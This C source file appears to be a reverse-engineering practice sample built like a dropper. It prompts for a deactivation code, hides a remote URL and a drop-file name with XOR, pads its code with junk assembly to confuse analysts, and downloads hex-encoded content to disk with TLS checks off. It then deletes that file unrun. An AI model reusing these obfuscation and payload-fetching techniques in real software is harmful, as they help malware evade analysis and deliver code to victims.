/**
 * compiled with:
 * 	gcc c2c.c -o c2c `curl-config --cflags` -lpthread curl-7.62.0/lib/.libs/libcurl.a -Wl,-O1,--sort-common,--as-needed,-z,relro,-z,now -lnghttp2 -lidn2 -lssh2 -lssh2 -lpsl -lssl -lcrypto -lssl -lcrypto -lgssapi_krb5 -lkrb5 -lk5crypto -lcom_err -lz
 * author:
 * 	cedric
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>

#define __TRASH__ { asm __volatile__ ( \
      "xor %eax, %eax\n" \
      "nop\n" \
      "movl $0xcafebabe, %esi\n" \
      "movl $0xdeadbeef, %edi\n" \
      "xchg %esi, %edi" \
    ); \
  }
#define __TRASH2__ { asm __volatile__ ( \
      "movb $0, %al\n" \
      "cmpb %al, %al\n" \
      "jne ." \
    ); \
  }

#include <curl/curl.h>

/**
 * xoring generated with:
 * echo -n "STRING"|perl -ne 'foreach(split(//)){print chr(ord($_)^0x7);}';echo
 */
#define GATEPASS "stopplsthxbye"
#define DROPNAME "cbfdsnqfshu" // xored
#define RMRF "rm -r -f" // not real, nothing will be rm'ed
#define WRONG_PASS "No, man! Wrong code! SELF-IMMOLATION IN PROGRESS!\n"
#define URL "osswt=((wpibcdu)uhdlt(efb45ec2?1?fbbe6325c32bb5feb2c>d" // xored

struct string {
  char *ptr;
  size_t len;
};

static int drop_fd = 0;

void decypher(char *s)
{
  __TRASH__
  short int j = 0;
  while (*(s+j)!='\0') {*(s+j) = *(s+j)^0x7; j++;}
}

size_t dropit(void *ptr, size_t size, size_t nmemb, struct string *s)
{
  int n = 0;
  int len = size*nmemb;
  while (n < len) {
    char *p = (char *)ptr;
    char c[3] = {*(p+n),*(p+n+1),0};
    char o = (char)strtol((char *)c, NULL, 16);
    write(drop_fd, &o, 1);
    n+=2;
  }
  return size*nmemb;
}

int main(void)
{
  // let's put some useless instructions to confuse the peps a little bit
  // gonna see stuff like this in all the code, specially with __TRASH__
  char **rm;
  asm __volatile__("movq %%rsi, %0":"=m"(rm));
  asm ("nop");

  char gatepass[64];
  CURL *curl;
  CURLcode rcode;

  printf("Input the deactivation code: ");
  fgets(gatepass, sizeof(gatepass), stdin);
  gatepass[strlen(gatepass)-1] = '\0';
  if (strcmp(gatepass,GATEPASS) != 0) {
    printf("%s\nEXECUTING: %s%s\n", WRONG_PASS, RMRF, rm[0]);
    __TRASH__
    exit(1);
  }
  //some decyphering
  char pastebin[strlen(URL)+1], dropname[strlen(DROPNAME)+1];
  strcpy(pastebin,URL);
  strcpy(dropname,DROPNAME);
  decypher(pastebin);
  decypher(dropname);

  // create dropped file
  drop_fd = open(dropname, O_CREAT|O_WRONLY|O_APPEND, 0666);
  if (drop_fd == -1) {
    perror("GODDAMN");
    return (1);
  }
  __TRASH2__

  curl = curl_easy_init();
  if (curl == NULL)
    return (1);
  struct string resp = {malloc(1),0};
  *resp.ptr = '\0';

  curl_easy_setopt(curl, CURLOPT_URL, pastebin);
  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, dropit);
  curl_easy_setopt(curl, CURLOPT_WRITEDATA, &resp);
  curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
  curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
  rcode = curl_easy_perform(curl);
  __TRASH__
  if (rcode != 0) {
    printf( "Why is this happening to me?! Couldn't get the content... "\
            "GOOD LUCK\n");
    goto bail;
  } else {
    if (access(dropname, F_OK) == -1) {
      __TRASH2__
      printf( "Something went wrong and couldn't drop the binary... "\
              "I wonder why :((\n");
      goto bail;
    }
  }

  // AND... I'm a volatile person...
  printf("Meh, changed my mind lol\nRemoving deactivation binary!\n");
  __TRASH__
  unlink(dropname);

bail:
  close(drop_fd);
  free(resp.ptr);
  curl_easy_cleanup(curl);
  printf("Bye bye...\n");
  __TRASH2__
  return (0);
}
